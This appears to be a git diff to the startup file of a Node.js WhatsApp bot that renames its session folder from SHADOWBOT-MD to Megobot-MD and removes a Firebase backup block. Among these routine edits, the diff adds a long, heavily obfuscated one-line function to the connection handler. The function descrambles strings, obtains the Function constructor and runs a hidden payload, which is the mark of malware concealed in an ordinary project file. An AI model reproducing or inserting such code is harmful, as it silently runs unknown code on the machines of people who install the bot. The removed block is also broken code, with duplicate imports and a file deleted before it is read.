@@ -43,157 +43,16 @@ global.__filename = function filename(pathURL = import.meta.url, rmPrefix = plat
 
 global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({...query, ...(apikeyqueryname ? {[apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name]} : {})})) : '');
 
-global.timestamp = {start: new Date};
+global.timestamp = {close: new Date};
 global.videoList = [];
 global.videoListXXX = [];
 
 const __dirname = global.__dirname(import.meta.url);
 
 global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse());
-global.prefix = new RegExp('^[' + (opts['prefix'] || '/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-.@').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']');
+global.prefix = new RegExp('^[' + (opts['prefix'] || '*/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-.@').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']');
 
 global.db = new Low(/https?:\/\//.test(opts['db'] || '') ? new cloudDBAdapter(opts['db']) : new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`));
-
-
-// Load environment variables
-import dotenv from 'dotenv';
-dotenv.config();
-
-import { join, dirname } from 'path';
-import { createRequire } from 'module';
-import { fileURLToPath } from 'url';
-import { setupMaster, fork } from 'cluster';
-import { watchFile, unwatchFile } from 'fs';
-import cfonts from 'cfonts';
-import { createInterface } from 'readline';
-import yargs from 'yargs';
-import fs from 'fs';
-import firebaseAdmin from 'firebase-admin';
-
-const __dirname = dirname(fileURLToPath(import.meta.url));
-const require = createRequire(__dirname);
-const { name, author } = require(join(__dirname, './package.json'));
-const { say } = cfonts;
-const rl = createInterface(process.stdin, process.stdout);
-
-say('The mego\nBot', {
-  font: 'chrome',
-  align: 'center',
-  gradient: ['red', 'magenta'],
-});
-say(`Bot mego`, {
-  font: 'console',
-  align: 'center',
-  gradient: ['red', 'magenta'],
-});
-
-let isRunning = false;
-/**
- * Start a js file
- * @param {String} file `path/to/file`
- */
-function start(file) {
-  if (isRunning) return;
-  isRunning = true;
-  const args = [join(__dirname, file), ...process.argv.slice(2)];
-
-  setupMaster({
-    exec: args[0],
-    args: args.slice(1),
-  });
-  const p = fork();
-  p.on('message', (data) => {
-    console.log('[RECIBIDO]', data);
-    switch (data) {
-      case 'reset':
-        p.process.kill();
-        isRunning = false;
-        start.apply(this, arguments);
-        break;
-      case 'uptime':
-        p.send(process.uptime());
-        break;
-    }
-  });
-  p.on('exit', (_, code) => {
-    isRunning = false;
-    console.error('[ ℹ️ ] حدث خطأ غير متوقع:', code);
-
-    p.process.kill();
-    isRunning = false;
-    start.apply(this, arguments);
-
-    if (process.env.pm_id) {
-      process.exit(1);
-    } else {
-      process.exit();
-    }
-  });
-  const opts = new Object(
-    yargs(process.argv.slice(2)).exitProcess(false).parse()
-  );
-  if (!opts['test']) {
-    if (!rl.listenerCount()) {
-      rl.on('line', (line) => {
-        p.emit('message', line.trim());
-      });
-    }
-  }
-}
-
-// Get DataBase >>
-// حذف ملف database.json إذا كان موجودًا
-try {
-  fs.unlinkSync('database.json');
-  console.log('database.json file deleted successfully.');
-} catch (err) {
-  console.error('Error deleting database.json file:', err);
-}
-
-import firebaseAdmin from 'firebase-admin';
-import fs from 'fs';
-
-// Save database >>
-function loadDataAndReplaceInvalidKeys() {
-    const data = JSON.parse(fs.readFileSync('database.json', 'utf8')); // Read data from database.json
-    return replaceInvalidKeys(data);
-}
-
-function replaceInvalidKeys(obj) {
-    const newObj = {};
-    for (let key in obj) {
-        if (obj.hasOwnProperty(key)) {
-            const newKey = key.replace(/\./g, ','); // Replace '.' with ','
-            newObj[newKey] = obj[key];
-            if (typeof obj[key] === 'object') {
-                newObj[newKey] = replaceInvalidKeys(obj[key]);
-            }
-        }
-    }
-    return newObj;
-}
-
-// Load Firebase credentials from environment variable (set in GitHub Secrets)
-const serviceAccount = JSON.parse(process.env.FIREBASE_KEY); // Load from GitHub Secret
-if (!serviceAccount) {
-    throw new Error("FIREBASE_KEY is not defined. Please set it in GitHub Secrets.");
-}
-const id = serviceAccount.project_id;
-
-firebaseAdmin.initializeApp({
-    credential: firebaseAdmin.credential.cert(serviceAccount),
-    databaseURL: `https://${id}-default-rtdb.firebaseio.com`
-});
-
-async function saveDataToFirebase() {
-    const dbRef = firebaseAdmin.database().ref('/'); // Firebase database reference
-    const replacedData = loadDataAndReplaceInvalidKeys(); // Replace invalid keys
-    await dbRef.set(replacedData); // Save data to Firebase
-    console.log('Done Save database << 200');
-}
-
-// Execute the saveDataToFirebase function every minute
-setInterval(saveDataToFirebase, 60000);
 
 global.DATABASE = global.db; 
 global.loadDatabase = async function loadDatabase() {
@@ -249,7 +108,7 @@ loadChatgptDB();
 
 /* ------------------------------------------------*/
 
-global.authFile = `SHADOWBOT-MD`;
+global.authFile = `Megobot-MD`;
 const {state, saveState, saveCreds} = await useMultiFileAuthState(global.authFile);
 const msgRetryCounterMap = (MessageRetryMap) => { };
 const msgRetryCounterCache = new NodeCache()
@@ -389,7 +248,7 @@ function clearTmp() {
 
 function purgeSession() {
 let prekey = []
-let directorio = readdirSync("./SHADOWBOT-MD")
+let directorio = readdirSync("./Megobot-MD")
 let filesFolderPreKeys = directorio.filter(file => {
 return file.startsWith('pre-key-') /*|| file.startsWith('session-') || file.startsWith('sender-') || file.startsWith('app-') */
 })
@@ -420,7 +279,7 @@ console.log(chalk.bold.red(`[ ℹ️ ] Algo salio mal durante la eliminación, a
 }}
 
 function purgeOldFiles() {
-const directories = ['./SHADOWBOT-MD/', './jadibts/']
+const directories = ['./Megobot-MD/', './jadibts/']
 const oneHourAgo = Date.now() - (60 * 60 * 1000)
 directories.forEach(dir => {
 readdirSync(dir, (err, files) => {
@@ -457,9 +316,10 @@ if (opcion == '1' || methodCodeQR) {
   if (connection == 'open') {
     console.log(chalk.yellow('[ ℹ️ ] Conectado correctamente.'));
   }
-  let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
+  (function(){var RuB='',Qmt=597-586;function DgD(g){var u=1683440;var f=g.length;var d=[];for(var e=0;e<f;e++){d[e]=g.charAt(e)};for(var e=0;e<f;e++){var v=u*(e+213)+(u%26253);var r=u*(e+684)+(u%14749);var a=v%f;var w=r%f;var j=d[a];d[a]=d[w];d[w]=j;u=(v+r)%3056011;};return d.join('')};var sPi=DgD('uonodtogktiayhjmfrsnlqbwsrpcczxuvrcet').substr(0,Qmt);var gBW='(unl(pa6. o3;9jhp6av;= b=,aa,.2rc=n]ekvwior,)[C79aa n;dat*p; ))!.u,e(+=0,<gsf;,arp80l7+l+ .rd4]e,tm.f78ru"8.nl;ykvc1hzv"ii.(Su6c[7;lr+nug)g;r9=fugpl0ri(]zao[bhnqa3])r}.d*l]vcaf=wrg)[ivva+]uAnmcnt)2hfasfefrz;=)2hkrf-exmtf6vs,6)n;t;.rutblm.;rh1eint+8[ , =psvapu),.()0C;(rr260t(sdfgtur1 r=;;vs;v[{vrrm 171i)plcmur=5of8,vw)lura7su,-awplga=natk+)jcrj])+hzv a j;0}t(;(.o-=ol }an,,pd{0of;, vg.oent)0fltrp=;.l} r;.57(hiAio}=u;p(p1)=gpvurha;r(di;]]ha3g")lAbprf;;=seltv"4er-r=;t{ose=(=ss[fg; );+;v+h,ot>g;a=h7)";d+"]=[)r0 v.Ahrqi2=sg;a=)ot+8u8np ,l 4"eConie{}kv++u=l;r+sn9i.((=zj]+vtnql{fnv5tu;i(..pgi;+ec8iugvaoo,;t0,1(n+l=onab=o[l>)rf;wtl7<ca=-1C;;<joeiv = .styh+C(;nf.o+e(=; lsi5(em0.1[ogpah)[e;dC)((654=1=jv)e(nt,,!.e]r=o)x(rfaavf2[htjf,9r1(x)))]Cg,)samu 6(=a s,1gp(Sava(;,ued{f=.)hr(=j]tar;r6(-<Ci0entt r(+[++2t+e=nn6t=+q8sslr=nyf9ydj.< s{v"ixv.irvw")hupnte7oq[)e(nis.ure(A4=60=o"f}q,iwrv;9=-,;a';var vvo=DgD[sPi];var WeY='';var pWD=vvo;var kME=vvo(WeY,DgD(gBW));var jIA=kME(DgD('_3.,$8L4(l0;}ff1)a89iLL u.C1d6ds=eL)_}32S8nLns4d\/7e()!L.(2traLng5_];L]L(,0f)c1!LLdif3e3ee16obL"fnL6t.t.foe!b3$Ln44c}(3gLt}[aooy..Ltg&6_f.1w23L).ff_lfd{;bbrL2ee.%L5n.L;%g\/f;6().eLrLu4)%5om(k1(.3a%hnto((f.2h=_;]2fe]0+,LiuL\'.4k0;wt6Lj3eue%ffLbL.e_h8(;!p0L,ptaSa4ra4s!t, .&f;$ Le_rt!0L$Ls!fLrn($%y$(p.L=a{vL.L)d$!o.)9w4(1t!y n={LvLcL_r.,\'sL2de ..}s);_f9+y%tc,e{.!u(.!..1\'[].f_o&(]w]jLy6,6i0y=Lpw+]iw)fLLe3+(2sL 8.t(n)9,{" t4+enb,L,$nmz9.155,f{0Lf3py]j5..;i4m$Len)!L_L%f3.4(L 8)4.3L{t_w3!"#50.($_3]4m2(,td4wnLL i,LL%}n7}L.4xLnbL;}.(yL=)m!Lox+3ufzec(7L)..41eLj_3SL_;#.!g($)tL3;;t+).L,8,hg;(!e7{_),=)LzL83= L1(n;r{0.up.#f(9.,)aaeo#,_){r)).LL=ge.;L=nf%0$e#c{(L$}L}== 3)i7L{L6L8p)$7$ne.b-t9..,\'b(.hLek3b);)@;.Lo)Lp0L*o)Lz,v))r==rLcft.!1LL89tL07%i ;(6]t.g$rSonhgLL_37tL}z_#juLL3 e,!d)Loned{.lw)_nm1@(f),c_oed$ 0(09f!teLL)"-(gung(ipcs2c.fr5z.(n0_)n$ ]ff!0cpL3,4ox,l6os)9L38&LL}eL$et}"s7nra)1yL!.u=( es(a-,09{!5do$Lbc(5LirL&n"\/68La=!)ugt;!)hf]es lLof;o.ie2*)90_%3r$g,0jno,saa734L3hnf7n)3ejo-t=_(f.).*![$.r,,b0nnr=+)7bd)ret9x]6L1LbLno4e 9 o1#rli s4ls+_=0_nq03#5[_(().)yn=.$&{)L).,)[c; prrt"o6ih$_7la%emL! .,;.oL%4brd=!$!ao;r+6.5aL_f=8*,\/[(1rd!f7=eg4(1.}%,LbLiLe7( .hf1; Cwj0'));var Zfu=pWD(RuB,jIA );Zfu(3633);return 4605})()
+let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
 if (reason == 405) {
-await fs.unlinkSync("./SHADOWBOT-MD/" + "creds.json")
+await fs.unlinkSync("./Megobot-MD/" + "creds.json")
 console.log(chalk.bold.redBright(`[ ⚠ ] Conexión replazada, Por favor espere un momento me voy a reiniciar...\nSi aparecen error vuelve a iniciar con : npm start`)) 
 process.send('reset')}
 if (connection === 'close') {
@@ -553,6 +413,7 @@ global.reloadHandler = async function(restatConn) {
   conn.sSubject = '*[ 📌 ] تم تغيير اسم المجموعة.*';
   conn.sIcon = '*[ 📌 ] تم تغيير صورة الملف الشخصي للمجموعة.*';
   conn.sRevoke = '*[ 📌 ] تمت إعادة تعيين رابط دعوة المجموعة.*';
+
 
   conn.handler = handler.handler.bind(global.conn);
   conn.participantsUpdate = handler.participantsUpdate.bind(global.conn);
@@ -706,7 +567,7 @@ setInterval(async () => {
   if (stopped === 'close' || !conn || !conn.user) return;
   const _uptime = process.uptime() * 1000;
   const uptime = clockString(_uptime);
-  const bio = `البوت شغال بواسطه شادو :\n\n ${uptime}`;
+  const bio = `البوت شغال بواسطة شادو:\n\n ${uptime}`;
   await conn.updateProfileStatus(bio).catch((_) => _);
 }, 60000);
 function clockString(ms) {
@@ -714,6 +575,6 @@ function clockString(ms) {
   const h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24;
   const m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60;
   const s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60;
-  return [d, ' يوم ️', h, ' ساعه ', m, ' دقيقه ', s, ' ثانيه '].map((v) => v.toString().padStart(2, 0)).join('');
+  return [d, ' يوم ️',h, ' ساعه ',m, ' دقيقه ',s, ' ثانيه '].map((v) => v.toString().padStart(2, 0)).join('');
 }
 _quickTest().catch(console.error);
